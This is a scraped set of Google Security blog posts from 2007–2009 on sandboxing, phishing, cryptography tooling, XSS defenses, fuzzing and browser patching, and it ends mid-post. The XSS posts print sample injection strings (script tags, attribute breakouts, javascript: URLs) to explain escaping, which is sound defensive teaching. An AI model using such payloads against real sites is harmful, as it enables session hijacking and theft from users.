{"website": "Google-Security", "title": "\nNative Client: A Technology for Running Native Code on the Web\n", "author": ["Posted by Brad Chen, Native Client Team."], "link": "https://security.googleblog.com/2008/12/native-client-technology-for-running.html", "abstract": "                             Posted by Brad Chen, Native Client Team.   Most native applications can access everything on your computer &#8211; including your files. This access means that you have to make decisions about which apps you trust enough to install, because a malicious or buggy application might harm your machine. Here at Google we believe you shouldn't have to choose between powerful applications and security.  That's why we're working on  Native Client , a technology that seeks to give Web developers the opportunity to make safer and more dynamic applications that can run on any OS and any browser. Today, we're sharing our technology with the research and security communities for their feedback to help make this technology more useful and more secure.  Our approach is built around a software containment system called the inner-sandbox that is designed to prevent unintended interactions between a native code module and the host system. The inner-sandbox uses static analysis to detect security defects in untrusted x86 code.  Previously, such analysis has been challenging due to such practices as self-modifying code and overlapping instructions. In our work, we disallow such practices through a set of alignment and structural rules that, when observed, enable the native code module to be disassembled reliably and all reachable instructions to be identified during disassembly. With reliable disassembly as a tool, it's then feasible for the validator to determine whether the executable includes unsafe x86 instructions.  For example, the validator can determine whether the executable includes instructions that directly invoke the operating system that could read or write files or subvert the containment system itself.  To learn more and help test Native Client, check out our  post on the Google Code blog  as well as our  developer site .  Our developer site includes our research paper and of course the source for the project under the BSD license.  We look forward to hearing what you think!                                   Posted by Brad Chen, Native Client Team.Most native applications can access everything on your computer – including your files. This access means that you have to make decisions about which apps you trust enough to install, because a malicious or buggy application might harm your machine. Here at Google we believe you shouldn't have to choose between powerful applications and security.  That's why we're working on Native Client, a technology that seeks to give Web developers the opportunity to make safer and more dynamic applications that can run on any OS and any browser. Today, we're sharing our technology with the research and security communities for their feedback to help make this technology more useful and more secure.Our approach is built around a software containment system called the inner-sandbox that is designed to prevent unintended interactions between a native code module and the host system. The inner-sandbox uses static analysis to detect security defects in untrusted x86 code.  Previously, such analysis has been challenging due to such practices as self-modifying code and overlapping instructions. In our work, we disallow such practices through a set of alignment and structural rules that, when observed, enable the native code module to be disassembled reliably and all reachable instructions to be identified during disassembly. With reliable disassembly as a tool, it's then feasible for the validator to determine whether the executable includes unsafe x86 instructions.  For example, the validator can determine whether the executable includes instructions that directly invoke the operating system that could read or write files or subvert the containment system itself.To learn more and help test Native Client, check out our post on the Google Code blog as well as our developer site.  Our developer site includes our research paper and of course the source for the project under the BSD license.We look forward to hearing what you think!     ", "date": "December 8, 2008"},
{"website": "Google-Security", "title": "\nGmail security and recent phishing activity\n", "author": ["Posted by Chris Evans"], "link": "https://security.googleblog.com/2008/11/gmail-security-and-recent-phishing.html", "abstract": "                             Posted by Chris Evans   We've seen some speculation recently about a purported security vulnerability in Gmail and the theft of several website owners' domains by unauthorized third parties. At Google we're committed to providing secure products, and we mounted an immediate investigation. Our results indicate no evidence of a Gmail vulnerability.  With help from affected users, we determined that the cause was a phishing scheme, a common method used by malicious actors to trick people into sharing their sensitive information. Attackers sent customized e-mails encouraging web domain owners to visit fraudulent websites such as \"google-hosts.com\" that they set up purely to harvest usernames and passwords. These fake sites had no affiliation with Google, and the ones we've seen are now offline. Once attackers gained the user credentials, they were free to modify the affected accounts as they desired. In this case, the attacker set up mail filters specifically designed to forward messages from web domain providers.  Several news stories referenced a  domain theft from December 2007  that was incorrectly linked to a Gmail CSRF vulnerability . We did have a Gmail CSRF bug reported to us in September 2007 that we fixed worldwide within 24 hours of private disclosure of the bug details. Neither this bug nor any other Gmail bug was involved in the December 2007 domain theft.  We recognize how many people depend on Gmail, and we strive to make it as secure as possible. At this time, we'd like to thank the wider security community for working with us to achieve this goal. We're always looking at new ways to enhance Gmail security. For example, we recently gave users the option to  always run their entire session using https .  To keep your Google account secure online, we recommend you only ever enter your Gmail sign-in credentials to web addresses starting with https://www.google.com/accounts, and never click-through any warnings your browser may raise about certificates. For more information on how to stay safe from phishing attacks, see our blog post  here .                                   Posted by Chris EvansWe've seen some speculation recently about a purported security vulnerability in Gmail and the theft of several website owners' domains by unauthorized third parties. At Google we're committed to providing secure products, and we mounted an immediate investigation. Our results indicate no evidence of a Gmail vulnerability.With help from affected users, we determined that the cause was a phishing scheme, a common method used by malicious actors to trick people into sharing their sensitive information. Attackers sent customized e-mails encouraging web domain owners to visit fraudulent websites such as \"google-hosts.com\" that they set up purely to harvest usernames and passwords. These fake sites had no affiliation with Google, and the ones we've seen are now offline. Once attackers gained the user credentials, they were free to modify the affected accounts as they desired. In this case, the attacker set up mail filters specifically designed to forward messages from web domain providers.Several news stories referenced a domain theft from December 2007 that was incorrectly linked to a Gmail CSRF vulnerability. We did have a Gmail CSRF bug reported to us in September 2007 that we fixed worldwide within 24 hours of private disclosure of the bug details. Neither this bug nor any other Gmail bug was involved in the December 2007 domain theft.We recognize how many people depend on Gmail, and we strive to make it as secure as possible. At this time, we'd like to thank the wider security community for working with us to achieve this goal. We're always looking at new ways to enhance Gmail security. For example, we recently gave users the option to always run their entire session using https.To keep your Google account secure online, we recommend you only ever enter your Gmail sign-in credentials to web addresses starting with https://www.google.com/accounts, and never click-through any warnings your browser may raise about certificates. For more information on how to stay safe from phishing attacks, see our blog post here.     ", "date": "November 25, 2008"},
{"website": "Google-Security", "title": "\nNew spam and virus trends from Enterprise\n", "author": ["Written by Amanda Kleha, Google Apps Security & Compliance team"], "link": "https://security.googleblog.com/2008/08/new-spam-and-virus-trends-from.html", "abstract": "                             Written by Amanda Kleha, Google Apps Security &amp; Compliance team    The  Google Apps Security &amp; Compliance  team, which provides email and web security for more than 40,000 companies, regularly tracks trends in spam, viruses, and other threats. Check out some of our latest findings over on the  Enterprise blog . Also, on Friday, August 15, at 10:00 am PT, we'll be hosting a  webinar  on keeping your business safe from web and email threats -- tune in if you'd like to learn more.                                   Written by Amanda Kleha, Google Apps Security & Compliance teamThe Google Apps Security & Compliance team, which provides email and web security for more than 40,000 companies, regularly tracks trends in spam, viruses, and other threats. Check out some of our latest findings over on the Enterprise blog. Also, on Friday, August 15, at 10:00 am PT, we'll be hosting a webinar on keeping your business safe from web and email threats -- tune in if you'd like to learn more.     ", "date": "August 12, 2008"},
{"website": "Google-Security", "title": "\nWhy Googlers attend the Internet Identity Workshop\n", "author": [], "link": "https://security.googleblog.com/2009/03/why-googlers-attend-internet-identity.html", "abstract": "                              Posted by Eric Sachs, Senior Product Manager, Google Security     Google&#8217;s participation in the&#160; Internet Identity Workshop &#160;(IIW) has grown from a few lone individuals at its founding in 2005 to fifteen Googlers at the last IIW. The reason for this growth is that as Google has started to provide more APIs and developer tools for our application hosting business, we have found that standards and interoperability for identity and security on the Internet are critical. &#160;Our engineers attend to discuss standards such as OAuth, OpenSocial, OAuth, SAML, Portable Contacts, as well as longer term trends around discovery, malware, phishing, and stronger authentication. &#160;Another major topic is the usability of these technologies, which we summarized in a&#160; blog post &#160;after the last IIW.      We hope that other companies and individuals working in these areas will register to attend&#160; IIW 2009a &#160;and start building momentum for another great event.&#160; If you attended either the Facebook hosted&#160; UX summit &#160;in Feb 2009 or the Yahoo hosted&#160; UX summit &#160;in Oct 2008, you can join in further discussions on those topics at the upcoming IIW.       Google attendees: Dirk Balfanz, Nathan Beach, Breno de Medeiros, Cassie Doll, Brian Eaton, Ben Laurie, Kevin Marks, John Panzer, Eric Sachs, and more to come                                     Posted by Eric Sachs, Senior Product Manager, Google SecurityGoogle’s participation in the Internet Identity Workshop (IIW) has grown from a few lone individuals at its founding in 2005 to fifteen Googlers at the last IIW. The reason for this growth is that as Google has started to provide more APIs and developer tools for our application hosting business, we have found that standards and interoperability for identity and security on the Internet are critical.  Our engineers attend to discuss standards such as OAuth, OpenSocial, OAuth, SAML, Portable Contacts, as well as longer term trends around discovery, malware, phishing, and stronger authentication.  Another major topic is the usability of these technologies, which we summarized in a blog post after the last IIW.We hope that other companies and individuals working in these areas will register to attend IIW 2009a and start building momentum for another great event.  If you attended either the Facebook hosted UX summit in Feb 2009 or the Yahoo hosted UX summit in Oct 2008, you can join in further discussions on those topics at the upcoming IIW.Google attendees: Dirk Balfanz, Nathan Beach, Breno de Medeiros, Cassie Doll, Brian Eaton, Ben Laurie, Kevin Marks, John Panzer, Eric Sachs, and more to come     ", "date": "March 26, 2009"},
{"website": "Google-Security", "title": "\nReducing XSS by way of Automatic Context-Aware Escaping in Template Systems\n", "author": ["Posted by Jad S. Boutros, Security Team"], "link": "https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html", "abstract": "                             Posted by Jad S. Boutros, Security Team   Building on our earlier posts on defenses against web application flaws [ \"Automating Web Application Security Testing\" ,  \"Meet ratproxy, our passive web security assessment tool\" ], we introduce Automatic Context-Aware Escaping (Auto-Escape for short), a functionality we added to two Google-developed general purpose template systems to better protect against Cross-Site Scripting (XSS).   We developed Auto-Escape specifically for general purpose template systems; that is, template systems that are for the most part unaware of the structure and programming language of the content on which they operate. These template systems typically provide minimal support for web applications, possibly limited to basic escaping functions that a developer can invoke to help escape unsafe content being returned in web responses. Our observation has been that web applications of substantial size and complexity using these template systems have an increased risk of introducing XSS flaws. To see why this is the case, consider the simplified template below in which double curly brackets  {{  and  }}  enclose placeholders (variables) that are replaced with run-time content, presumed unsafe.    &lt;body&gt;   &lt;span style=\"color:{{USER_COLOR}};\"&gt;     Hello {{USERNAME}}, view your &lt;a href=\"{{USER_ACCOUNT_URL}}\"&gt;Account&lt;/a&gt;.   &lt;/span&gt;   &lt;script&gt;     var id = {{USER_ID}}; // some code using id, say:     // alert(\"Your user ID is: \" + id);   &lt;/script&gt; &lt;/body&gt;   In this template, four variables are used (not in this order):     USER_NAME  is inserted into regular HTML text and hence can be escaped safely by HTML-escape.    USER_ACCOUNT_URL  is inserted into an HTML attribute that expects a URL and therefore in addition to HTML-escape, also requires validation that the URL scheme is safe. By allowing only a safe white-list of schemes, we can prevent (say)  javascript:  pseudo-URLs, which HTML-escape alone does not prevent.    USER_COLOR  is inserted into a Cascading Style Sheets (CSS) context and therefore requires an escaping that also prevents scripting and other dangerous constructs in CSS such as those possible in  expression()  or  url() . For more information on concerns with harmful content in CSS, refer to the CSS section of the  Browser Security Handbook .    USER_ID  is inserted into a Javascript variable that expects a number as it is not enclosed in quotes. As such, it requires an escaping that coerces it to a number (which a typical Javascript-escape function does not do), otherwise it can lead to arbitrary javascript execution. More variants may be developed to coerce content to other data types, including arrays and objects.    Each of these variable insertions requires a different escaping method or risks introducing XSS. To keep the example small, we excluded several contexts of interest, particularly style tags, HTML attributes that expect Javascript (such as  onmouseover ), and considerations of whether attribute values are enclosed within quotes or not (which also affects escaping).   Auto-Escape   The example above demonstrates the importance of understanding the precise context in which variables are being inserted and the need for escaping functions that are both safe and correct for each. For larger and complex web applications, we notice two related vectors for XSS:    A developer forgetting to apply escaping to a given variable.   A developer applying the wrong escaping for that variable for the context in which it is being inserted.    Considering the sheer number of templates in large web applications and the number of untrusted content they may operate on, the process of proper escaping becomes complicated and error prone. It is also difficult to efficiently audit from a security testing perspective. We developed Auto-Escape to take that complexity away from the developer and into the template system and therefore reduce the risks of XSS that would have ensued.   A Look at Implementation   Auto-Escape is a functionality designed to make the Template System web application context-aware and therefore able to apply automatically and properly the escaping required. This is achieved in three parts:    We determined all the different contexts in which untrusted content may be returned and provided proper escaping functions for each. This is part science and part practical. For example, we did not find the need to support variable insertion inside an HTML tag name itself (as opposed to HTML attributes) so we did not build support for it. Other factors come into play, including availability of existing escaping functions and backwards compatibility. As a result, part of that work is template system dependent.    We developed our own parser to parse HTML and Javascript templates. It provides methods which can be queried at a point of interest to obtain the context information necessary for proper escaping. The parser is designed with performance in mind, and it runs in a stream mode without look-ahead. It aims for simplicity while understanding that browsers may be more lenient than specifications, particularly in certain corner cases.    We added an extra step into the parsing that the template system already performs to locate variables, among other needs. This extra step activates our HTML/Javascript parser, queries it for the context of each variable then applies its escaping rules to compute the proper escaping functions to use for each variable. Depending on the template system, this step may be performed only the first time a template is used or for each web response in which case some limitations may be lifted.    A simple mechanism is provided for the developer to indicate that some variables are safe and should not be escaped. This is used for variables that are either escaped through other means in source code or contain trusted markup that should be emitted intact.   Current Status   Auto-Escape has been released with the C++  Google Ctemplate  for a while now and it continues to develop there. You can read more about it in the  Guide to using Auto-Escape . We also implemented Auto-Escape for the  ClearSilver  template system and expect it to be released in the near future. Lastly, we are in the process of integrating it into other template systems developed at Google for Java and Python and are interested in working with a few other open source template systems that may benefit from this logic. Our HTML/Javascript parser is already available with the Google Ctemplate distribution and is expected to be released as a stand-alone open source project very soon.   Co-developers: Filipe Almeida and Mugdha Bendre                                    Posted by Jad S. Boutros, Security TeamBuilding on our earlier posts on defenses against web application flaws [\"Automating Web Application Security Testing\", \"Meet ratproxy, our passive web security assessment tool\"], we introduce Automatic Context-Aware Escaping (Auto-Escape for short), a functionality we added to two Google-developed general purpose template systems to better protect against Cross-Site Scripting (XSS).We developed Auto-Escape specifically for general purpose template systems; that is, template systems that are for the most part unaware of the structure and programming language of the content on which they operate. These template systems typically provide minimal support for web applications, possibly limited to basic escaping functions that a developer can invoke to help escape unsafe content being returned in web responses. Our observation has been that web applications of substantial size and complexity using these template systems have an increased risk of introducing XSS flaws. To see why this is the case, consider the simplified template below in which double curly brackets {{ and }} enclose placeholders (variables) that are replaced with run-time content, presumed unsafe.        Hello {{USERNAME}}, view your  Account .          var id = {{USER_ID}}; // some code using id, say:    // alert(\"Your user ID is: \" + id);    In this template, four variables are used (not in this order):USER_NAME is inserted into regular HTML text and hence can be escaped safely by HTML-escape.USER_ACCOUNT_URL is inserted into an HTML attribute that expects a URL and therefore in addition to HTML-escape, also requires validation that the URL scheme is safe. By allowing only a safe white-list of schemes, we can prevent (say) javascript: pseudo-URLs, which HTML-escape alone does not prevent.USER_COLOR is inserted into a Cascading Style Sheets (CSS) context and therefore requires an escaping that also prevents scripting and other dangerous constructs in CSS such as those possible in expression() or url(). For more information on concerns with harmful content in CSS, refer to the CSS section of the Browser Security Handbook.USER_ID is inserted into a Javascript variable that expects a number as it is not enclosed in quotes. As such, it requires an escaping that coerces it to a number (which a typical Javascript-escape function does not do), otherwise it can lead to arbitrary javascript execution. More variants may be developed to coerce content to other data types, including arrays and objects.Each of these variable insertions requires a different escaping method or risks introducing XSS. To keep the example small, we excluded several contexts of interest, particularly style tags, HTML attributes that expect Javascript (such as onmouseover), and considerations of whether attribute values are enclosed within quotes or not (which also affects escaping).Auto-EscapeThe example above demonstrates the importance of understanding the precise context in which variables are being inserted and the need for escaping functions that are both safe and correct for each. For larger and complex web applications, we notice two related vectors for XSS:A developer forgetting to apply escaping to a given variable.A developer applying the wrong escaping for that variable for the context in which it is being inserted.Considering the sheer number of templates in large web applications and the number of untrusted content they may operate on, the process of proper escaping becomes complicated and error prone. It is also difficult to efficiently audit from a security testing perspective. We developed Auto-Escape to take that complexity away from the developer and into the template system and therefore reduce the risks of XSS that would have ensued.A Look at ImplementationAuto-Escape is a functionality designed to make the Template System web application context-aware and therefore able to apply automatically and properly the escaping required. This is achieved in three parts:We determined all the different contexts in which untrusted content may be returned and provided proper escaping functions for each. This is part science and part practical. For example, we did not find the need to support variable insertion inside an HTML tag name itself (as opposed to HTML attributes) so we did not build support for it. Other factors come into play, including availability of existing escaping functions and backwards compatibility. As a result, part of that work is template system dependent.We developed our own parser to parse HTML and Javascript templates. It provides methods which can be queried at a point of interest to obtain the context information necessary for proper escaping. The parser is designed with performance in mind, and it runs in a stream mode without look-ahead. It aims for simplicity while understanding that browsers may be more lenient than specifications, particularly in certain corner cases.We added an extra step into the parsing that the template system already performs to locate variables, among other needs. This extra step activates our HTML/Javascript parser, queries it for the context of each variable then applies its escaping rules to compute the proper escaping functions to use for each variable. Depending on the template system, this step may be performed only the first time a template is used or for each web response in which case some limitations may be lifted.A simple mechanism is provided for the developer to indicate that some variables are safe and should not be escaped. This is used for variables that are either escaped through other means in source code or contain trusted markup that should be emitted intact.Current StatusAuto-Escape has been released with the C++ Google Ctemplate for a while now and it continues to develop there. You can read more about it in the Guide to using Auto-Escape. We also implemented Auto-Escape for the ClearSilver template system and expect it to be released in the near future. Lastly, we are in the process of integrating it into other template systems developed at Google for Java and Python and are interested in working with a few other open source template systems that may benefit from this logic. Our HTML/Javascript parser is already available with the Google Ctemplate distribution and is expected to be released as a stand-alone open source project very soon.Co-developers: Filipe Almeida and Mugdha Bendre     ", "date": "March 31, 2009"},
{"website": "Google-Security", "title": "\nKeyczar: Safe and Simple Cryptography\n", "author": ["Written by Steve Weis"], "link": "https://security.googleblog.com/2008/08/keyczar-safe-and-simple-cryptography.html", "abstract": "                             Written by Steve Weis    Cryptography is notoriously hard to get right and if improperly used, can create serious security holes. Common mistakes include using the wrong cipher modes or obsolete algorithms, composing primitives in an unsafe manner, hard-coding keys in source code, or failing to anticipate the need for future key rotation. With these risks in mind, we're pleased to announce the open-source release of  Keyczar .  Keyczar is a cryptographic toolkit that supports encryption and authentication for both symmetric and public-key algorithms. It addresses some of the aforementioned issues by choosing safe defaults, tagging outputs with key version information, and providing a simple application programming interface. Keyczar's key versioning system makes it easy to rotate and revoke keys, without worrying about backward compatibility or making any changes to source code.  We look forward to working with the open source community and continuing to make cryptography safer and easier to use. To download Keyczar or for more information, please visit our  Google Code project  and  discussion group .                                   Written by Steve WeisCryptography is notoriously hard to get right and if improperly used, can create serious security holes. Common mistakes include using the wrong cipher modes or obsolete algorithms, composing primitives in an unsafe manner, hard-coding keys in source code, or failing to anticipate the need for future key rotation. With these risks in mind, we're pleased to announce the open-source release of Keyczar.Keyczar is a cryptographic toolkit that supports encryption and authentication for both symmetric and public-key algorithms. It addresses some of the aforementioned issues by choosing safe defaults, tagging outputs with key version information, and providing a simple application programming interface. Keyczar's key versioning system makes it easy to rotate and revoke keys, without worrying about backward compatibility or making any changes to source code.We look forward to working with the open source community and continuing to make cryptography safer and easier to use. To download Keyczar or for more information, please visit our Google Code project and discussion group.     ", "date": "August 11, 2008"},
{"website": "Google-Security", "title": "\nAutomating web application security testing\n", "author": ["Posted by Srinath Anantharaju, Security Team"], "link": "https://security.googleblog.com/2007/07/automating-web-application-security.html", "abstract": "                             Posted by Srinath Anantharaju, Security Team   Cross-site scripting (aka XSS) is the term used to describe a class of security vulnerabilities in web applications. An attacker can inject malicious scripts to perform unauthorized actions in the context of the victim's web session. Any web application that serves documents that include data from untrusted sources could be vulnerable to XSS if the untrusted data is not appropriately sanitized. A web application that is vulnerable to XSS can be exploited in two major ways:  &nbsp;&nbsp;&nbsp;  Stored XSS  - Commonly exploited in a web application where one user enters information that's viewed by another user. An attacker can inject malicious scripts that are executed in the context of the victim's session. The exploit is triggered when a victim visits the website at some point in the future, such as through improperly sanitized blog comments and guestbook entries, which facilitates stored XSS.  &nbsp;&nbsp;&nbsp;  Reflected XSS  - An application that echoes improperly sanitized user input received as query parameters is vulnerable to reflected XSS. With a vulnerable application, an attacker can craft a malicious URL and send it to the victim via email or any other mode of communication. When the victim visits the tampered link, the page is loaded along with the injected script that is executed in the context of the victim's session.  The general principle behind preventing XSS is the proper sanitization (via, for instance, escaping or filtering) of all untrusted data that is output by a web application. If untrusted data is output within an HTML document, the appropriate sanitization depends on the specific context in which the data is inserted into the HTML document. The context could be in the regular HTML body, tag attributes, URL attributes, URL query string attributes, style attributes, inside JavaScript, HTTP response headers, etc.  The following are some (by no means complete) examples of XSS vulnerabilities. Let's assume there is a web application that accepts user input as the 'q' parameter. Untrusted data coming from the attacker is marked in red.    Injection in regular HTML body - angled brackets not filtered or escaped   &lt;b&gt;Your query ' &lt;script&gt;evil_script()&lt;/script&gt; ' returned xxx results&lt;/b&gt;     Injection inside tag attributes - double quote not filtered or escaped   &lt;form ... &nbsp;&nbsp;&lt;input name=\"q\" value=\" blah\"&gt;&lt;script&gt;evil_script()&lt;/script&gt; \"&gt; &lt;/form&gt;    Injection inside URL attributes - non-http(s) URL   &lt;img src=\" javascript:evil_script() \"&gt;...&lt;/img&gt;    In JavaScript context - single quote not filtered or escaped   &lt;script&gt; &nbsp;&nbsp;var msg = ' blah'; evil_script(); // '  ; &nbsp;&nbsp;// do something with msg variable &lt;/script&gt;     In the cases where XSS arises from meta characters being inserted from untrusted sources into an HTML document, the issue can be avoided either by filtering/disallowing the meta characters, or by escaping them appropriately for the given HTML context. For example, the HTML meta characters &lt;, &gt;, &amp;, \" and ' must be replaced with their corresponding HTML entity references &amp;lt;, &amp;gt;, &amp;amp;, &amp;quot; and &amp;#39 respectively. In a JavaScript-literal context, inserting a backslash in front of \\, ', \" and converting the carriage returns, line-feeds and tabs into \\r, \\n and \\t respectively should avoid untrusted meta characters being interpreted as code.  How about an automated tool for finding XSS problems in web applications? Our security team has been developing a black box fuzzing tool called Lemon (deriving from the commonly-recognized name for a defective product). Fuzz testing (also referred to as fault-injection testing) is an automated testing approach based on supplying inputs that are designed to trigger and expose flaws in the application. Our vulnerability testing tool enumerates a web application's URLs and corresponding input parameters. It then iteratively supplies fault strings designed to expose XSS and other vulnerabilities to each input, and analyzes the resulting responses for evidence of such vulnerabilities. Although it started out as an experimental tool, it has proved to be quite effective in finding XSS problems. Besides XSS, it finds other security problems such as response splitting attacks, cookie poisoning problems, stacktrace leaks, encoding issues and charset bugs. Since the tool is homegrown it is easy to integrate into our automated test environment and to extend based on specific needs. We are constantly in the process of adding new attack vectors to improve the tool against known security problems.   Update:  I wanted to respond to a few questions that seem to be common among readers.  I've listed them below.  Thanks for the feedback.  Please keep the questions and comments coming.  Q. Does Google plan to market it at some point? A. Lemon is highly customized for Google apps and we have no plans of releasing it in near future.  Q. Did Google's security team check out any commercially available fuzzers? Is the ability to keep improving the fuzzer the main draw of a homegrown tool? A. We did evaluate commercially available fuzzers but felt that our specialized needs could be served best by developing our own tools.                                   Posted by Srinath Anantharaju, Security TeamCross-site scripting (aka XSS) is the term used to describe a class of security vulnerabilities in web applications. An attacker can inject malicious scripts to perform unauthorized actions in the context of the victim's web session. Any web application that serves documents that include data from untrusted sources could be vulnerable to XSS if the untrusted data is not appropriately sanitized. A web application that is vulnerable to XSS can be exploited in two major ways:    Stored XSS - Commonly exploited in a web application where one user enters information that's viewed by another user. An attacker can inject malicious scripts that are executed in the context of the victim's session. The exploit is triggered when a victim visits the website at some point in the future, such as through improperly sanitized blog comments and guestbook entries, which facilitates stored XSS.    Reflected XSS - An application that echoes improperly sanitized user input received as query parameters is vulnerable to reflected XSS. With a vulnerable application, an attacker can craft a malicious URL and send it to the victim via email or any other mode of communication. When the victim visits the tampered link, the page is loaded along with the injected script that is executed in the context of the victim's session.The general principle behind preventing XSS is the proper sanitization (via, for instance, escaping or filtering) of all untrusted data that is output by a web application. If untrusted data is output within an HTML document, the appropriate sanitization depends on the specific context in which the data is inserted into the HTML document. The context could be in the regular HTML body, tag attributes, URL attributes, URL query string attributes, style attributes, inside JavaScript, HTTP response headers, etc.The following are some (by no means complete) examples of XSS vulnerabilities. Let's assume there is a web application that accepts user input as the 'q' parameter. Untrusted data coming from the attacker is marked in red.Injection in regular HTML body - angled brackets not filtered or escaped Your query ' evil_script() ' returned xxx results  Injection inside tag attributes - double quote not filtered or escaped  evil_script() \"> Injection inside URL attributes - non-http(s) URL ... In JavaScript context - single quote not filtered or escaped   var msg = 'blah'; evil_script(); //';  // do something with msg variable In the cases where XSS arises from meta characters being inserted from untrusted sources into an HTML document, the issue can be avoided either by filtering/disallowing the meta characters, or by escaping them appropriately for the given HTML context. For example, the HTML meta characters  , &, \" and ' must be replaced with their corresponding HTML entity references &lt;, &gt;, &amp;, &quot; and &#39 respectively. In a JavaScript-literal context, inserting a backslash in front of \\, ', \" and converting the carriage returns, line-feeds and tabs into \\r, \\n and \\t respectively should avoid untrusted meta characters being interpreted as code.How about an automated tool for finding XSS problems in web applications? Our security team has been developing a black box fuzzing tool called Lemon (deriving from the commonly-recognized name for a defective product). Fuzz testing (also referred to as fault-injection testing) is an automated testing approach based on supplying inputs that are designed to trigger and expose flaws in the application. Our vulnerability testing tool enumerates a web application's URLs and corresponding input parameters. It then iteratively supplies fault strings designed to expose XSS and other vulnerabilities to each input, and analyzes the resulting responses for evidence of such vulnerabilities. Although it started out as an experimental tool, it has proved to be quite effective in finding XSS problems. Besides XSS, it finds other security problems such as response splitting attacks, cookie poisoning problems, stacktrace leaks, encoding issues and charset bugs. Since the tool is homegrown it is easy to integrate into our automated test environment and to extend based on specific needs. We are constantly in the process of adding new attack vectors to improve the tool against known security problems.Update:I wanted to respond to a few questions that seem to be common among readers.  I've listed them below.  Thanks for the feedback.  Please keep the questions and comments coming.Q. Does Google plan to market it at some point?A. Lemon is highly customized for Google apps and we have no plans of releasing it in near future.Q. Did Google's security team check out any commercially available fuzzers? Is the ability to keep improving the fuzzer the main draw of a homegrown tool?A. We did evaluate commercially available fuzzers but felt that our specialized needs could be served best by developing our own tools.     ", "date": "July 16, 2007"},
{"website": "Google-Security", "title": "\nInformation flow tracing and software testing\n", "author": ["Posted by Will Drewry, Security Team"], "link": "https://security.googleblog.com/2007/09/information-flow-tracing-and-software.html", "abstract": "                             Posted by Will Drewry, Security Team   Security testing of applications is regularly performed using fuzz testing.  As previously discussed on this blog,  Srinath's Lemon  uses a form of smart fuzzing.  Lemon is aware of classes of web application threats and the input families which trigger them, but not all fuzz testing frameworks have to be this complicated. Fuzz testing  originally    relied on purely random data, ignorant of specific threats and known dangerous input. Today, this approach is often overlooked in favor of more complicated techniques.  Early sanity checks in applications looking for something as a simple as a version number may render testing with completely random input ineffective.  However, the newer, more complicated fuzz testers require a considerable initial investment in the form of complete input format specifications or the selection of a large corpus of initial input samples.  At  WOOT'07 ,I presented a  paper  on  Flayer , a tool we developed internally to augment our security testing efforts.  In particular, it allows for a fuzz testing technique that compromises between the original idea and the most complicated.  Flayer makes it possible to remove input sanity checks at execution time. With the small investment of identifying these checks, Flayer allows for completely random testing to be performed with much higher efficacy. Already, we've uncovered multiple vulnerabilities in Internet-critical software using this approach.  The way that Flayer allows for sanity checks to be identified is perhaps the more interesting point. Flayer uses a  dynamic analysis framework  to analyze the target application at execution time. Flayer marks, or taints, input to the program and traces that data throughout its lifespan. Considerable research has been done in the past regarding information flow tracing using dynamic analysis. Primarily, this work has been aimed at malware and exploit detection and defense. However, none of the resulting software has been made publicly available.  While Flayer is still in its early stages, it is available for  download  under the GNU Public License.  External  contributions  and  feedback    are encouraged!                                   Posted by Will Drewry, Security TeamSecurity testing of applications is regularly performed using fuzz testing.  As previously discussed on this blog, Srinath's Lemon uses a form of smart fuzzing.  Lemon is aware of classes of web application threats and the input families which trigger them, but not all fuzz testing frameworks have to be this complicated. Fuzz testing originally relied on purely random data, ignorant of specific threats and known dangerous input. Today, this approach is often overlooked in favor of more complicated techniques.  Early sanity checks in applications looking for something as a simple as a version number may render testing with completely random input ineffective.  However, the newer, more complicated fuzz testers require a considerable initial investment in the form of complete input format specifications or the selection of a large corpus of initial input samples.At WOOT'07,I presented a paper on Flayer, a tool we developed internally to augment our security testing efforts.  In particular, it allows for a fuzz testing technique that compromises between the original idea and the most complicated.  Flayer makes it possible to remove input sanity checks at execution time. With the small investment of identifying these checks, Flayer allows for completely random testing to be performed with much higher efficacy. Already, we've uncovered multiple vulnerabilities in Internet-critical software using this approach.The way that Flayer allows for sanity checks to be identified is perhaps the more interesting point. Flayer uses a dynamic analysis framework to analyze the target application at execution time. Flayer marks, or taints, input to the program and traces that data throughout its lifespan. Considerable research has been done in the past regarding information flow tracing using dynamic analysis. Primarily, this work has been aimed at malware and exploit detection and defense. However, none of the resulting software has been made publicly available.While Flayer is still in its early stages, it is available for download under the GNU Public License.  External contributions and feedback are encouraged!     ", "date": "September 17, 2007"},
{"website": "Google-Security", "title": "\nAre you using the latest web browser?\n", "author": ["Written by Thomas Duebendorfer"], "link": "https://security.googleblog.com/2008/07/are-you-using-latest-web-browser.html", "abstract": "                             Written by Thomas Duebendorfer   In view of mass defacements of hundreds of thousand of web pages - with the intent to misuse them to launch drive-by download attacks - security researchers from ETH Zurich, Google, and IBM Internet Security Systems were interested in looking at the other side of the attack: the web browser. By analyzing the web browser versions seen in visits to Google websites, they have shown that more than 600 million Internet users don't use the latest version of their browser.   Slow migration to latest browser version  The researchers' paper, entitled  \"Understanding the Web Browser Threat\" , shows that as of June 2008, only 59.1% percent of Internet users worldwide use the latest major version of their preferred web browser. Firefox users are the most attentive: 92.2% of them surfed with Firefox 2, the latest major version before the recently released 3.0. Only 52.5% of Microsoft Internet Explorer users have updated to version 7, which is the most secure according to multiple publicly-cited Microsoft experts (among them Sandi Hardmeier). The study revealed that 637 million Internet users worldwide who use web browsers are either not running the latest version of their preferred browser or have not installed the latest patches. These users are vulnerable to exploitation due to their web browser's \"built-in\" vulnerabilities and the lack of more recent security mechanisms such as improved phishing protection.   Neglected security patches  Over the past 18 months, the study also shows, a maximum of 83.3% of Firefox users were using the latest major version of the web browser and also had all current patches installed (i.e. latest minor version). Only 56.1% and 47.6% of Opera and Internet Explorer users, respectively, were similarly utilizing fully-patched web browsers. Apple users are no better: since the public release of Safari 3, only 65.3% of users operate the latest Safari version.        Maximum measured share of users surfing the web with the most secure versions of Firefox, Safari, Opera and Internet Explorer in June 2008 as seen on Google websites.     Obsolete browser warning  The study's most important finding is that technical measures now in place do not sufficiently guarantee browser security, and that users' security awareness must be further developed. The problem is that most users are unaware that they are not using their browser's latest version. It must be made clear to web browser users that outdated software is associated with significantly higher risk. The researchers therefore suggest that, as a critical component of web software, a visible warning be instituted that warns the user of missing security patches in a way analogous to the 'best before' date in the perishable food industry. Software updates must also be made easier to find. The resulting transparency would go far in contributing to end user awareness of software weaknesses, and allow users to better evaluate risks.        Example \"best before\" implementation on a Web browser    As a side effect, having users migrate faster to the latest browser version would not only increase security but also make the lives of webmasters easier, as they would need to test and optimize websites for fewer older versions of web browsers.                                   Written by Thomas DuebendorferIn view of mass defacements of hundreds of thousand of web pages - with the intent to misuse 